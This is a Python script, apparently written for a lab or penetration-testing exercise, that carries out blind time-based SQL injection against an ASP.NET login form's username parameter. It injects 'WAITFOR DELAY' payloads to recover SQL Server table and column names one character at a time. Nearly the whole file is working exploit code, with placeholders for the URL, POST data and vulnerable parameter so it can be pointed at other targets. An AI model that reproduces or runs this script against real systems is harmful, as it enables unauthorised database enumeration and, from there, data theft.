import sys
import requests
import urllib3
import urllib
import string

print("IMPORTANT NOTE: this tool only picks one name per character.")
print("if there are multiple column names that start with 'p', it will only show one of them")

'''
Change the values for the following variables:
URL
POST_DATA
VULN_PARAM
'''

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + [chr(i) for i in range(48, 58)] + ['_', '-']
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

URL = "http://192.168.203.63:450" # CHANGE THIS
POST_DATA = "__VIEWSTATE=%2FwEPDwUKLTQ0NDEwMDQ5Mg9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUeSW52YWxpZCB1c2VybmFtZSBvciBwYXNza2V5Li4uZGRkikLoDB%2B%2FpXdQqiz9h%2Bj5nHjE4OqEYro7hz%2FkDYh48fQ%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAQ5uNqOYHbIeyi7LRhe1%2B7mG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb69X6Gyh7W5UwTVXhfLT4lC%2FUYzzbo01YDuyOekjcuLek%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=TEST&ctl00%24ContentPlaceHolder1%24PasswordTextBox=&ctl00%24ContentPlaceHolder1%24LoginButton=Enter" # CHANGE THIS
PARAMS = dict(urllib.parse.parse_qsl(POST_DATA))
VULN_PARAM = "ctl00$ContentPlaceHolder1$UsernameTextBox" # CHANGE THIS

TABLE_NAME = ""
TABLE_FOUND = []
def get_table_name():
    global TABLE_NAME
    global TABLE_FOUND

    for c in chars:
        if len(TABLE_NAME) >= 1:
            exploit = f"'; IF EXISTS (SELECT 1 FROM sys.tables WHERE name LIKE '{TABLE_NAME}{c}%') WAITFOR DELAY '0:0:10';--"
        else:
            exploit = f"'; IF EXISTS (SELECT 1 FROM sys.tables WHERE name LIKE '{c}%') WAITFOR DELAY '0:0:10';--"
        
        if VULN_PARAM in POST_DATA or urllib.parse.quote(VULN_PARAM) in POST_DATA:
            PARAMS[VULN_PARAM] = exploit
        #print(PARAMS)
        #input("here")

        params = urllib.parse.urlencode(PARAMS)
        r = requests.post(URL, verify=False, data=params, proxies=proxies, headers=headers)
        #print(r.elapsed.total_seconds())
        if int(r.elapsed.total_seconds()) > 9:
            #print(c)
            TABLE_NAME += c
            print(TABLE_NAME)
            get_table_name()
        else:
            pass
    if len(TABLE_NAME) > 1:         
        TABLE_FOUND.append(TABLE_NAME)
    return

#TABLE_NAME = ""
#get_table_name(TABLE_NAME)


COLUMN_NAME = ""
COLUMN_FOUND = []
def get_column_name(t):
    global COLUMN_NAME
    global index
    global COLUMN_FOUND

    for c in chars:
        if len(COLUMN_NAME) >= 1:
            # "'; IF EXISTS (SELECT 1 FROM sys.columns col JOIN sys.tables tab ON col.object_id = tab.object_id WHERE tab.name = '{TABLE_NAME}' AND col.name like {COLUMN_NAME}'u%') WAITFOR DELAY '0:0:10';--"
            exploit = f"'; IF EXISTS (SELECT 1 FROM sys.columns col JOIN sys.tables tab ON col.object_id = tab.object_id WHERE tab.name = '{t}' AND col.name like '{COLUMN_NAME}{c}%') WAITFOR DELAY '0:0:10';--"
        else:
            exploit = f"'; IF EXISTS (SELECT 1 FROM sys.columns col JOIN sys.tables tab ON col.object_id = tab.object_id WHERE tab.name = '{t}' AND col.name like '{c}%') WAITFOR DELAY '0:0:10';--"
        
        if VULN_PARAM in POST_DATA or urllib.parse.quote(VULN_PARAM) in POST_DATA:
            PARAMS[VULN_PARAM] = exploit
        #print(PARAMS)
        #input("here")

        params = urllib.parse.urlencode(PARAMS)
        r = requests.post(URL, verify=False, data=params, proxies=proxies, headers=headers)
        #print(r.elapsed.total_seconds())
        if int(r.elapsed.total_seconds()) > 9:
            #print(c)
            COLUMN_NAME += c
            #sys.stdout.write('\r' + COLUMN_NAME)
            #sys.stdout.flush()
            print(COLUMN_NAME)
            get_column_name(t)

    if len(COLUMN_NAME) > 1:
        COLUMN_FOUND.append(COLUMN_NAME)
    return


def get_all():
    default_table = "users"
    global TABLE_NAME
    global TABLE_FOUND
    global COLUMN_NAME
    global COLUMN_FOUND
    
    print("checking table name")
    for c in chars:
        TABLE_NAME = c
        print(f"checking {TABLE_NAME}")
        get_table_name()
    # remove duplicates (these are appended due to recurse)
    TABLE_FOUND = list(dict.fromkeys(TABLE_FOUND))
    print(TABLE_FOUND)
    input("stopping here for debugging")

    # if the tables were found loop through each to find their respective column names
    if len(TABLE_FOUND) > 1:
        print("going through each table")
        for t in TABLE_FOUND:
            print(f"checking column names for table: {t}")
            for c in chars:
                COLUMN_NAME = c
                print(f"checking {COLUMN_NAME}")
                get_column_name(t)
    else:
        print(f"checking column names for table: {TABLE_NAME}")
        for c in chars:
            COLUMN_NAME = c
            print(f"checking {COLUMN_NAME}")
            get_column_name(default_table)
    if len(COLUMN_FOUND) > 1:
        COLUMN_FOUND = list(dict.fromkeys(COLUMN_FOUND))


def get_table():
    get_table_name()


def get_colums():
    default_table = "users"
    
    global COLUMN_NAME

    if len(TABLE_NAME) > 1:
        print(f"checking column names for: table {TABLE_NAME}")
        for c in chars:
            COLUMN_NAME = c
            print(f"checking {COLUMN_NAME}")
            get_column_name(TABLE_NAME)
    else:
        print("checking column names for default value: 'users'")
        for c in chars:
            COLUMN_NAME = c
            print(f"checking {COLUMN_NAME}")
            get_column_name(default_table)

get_all()
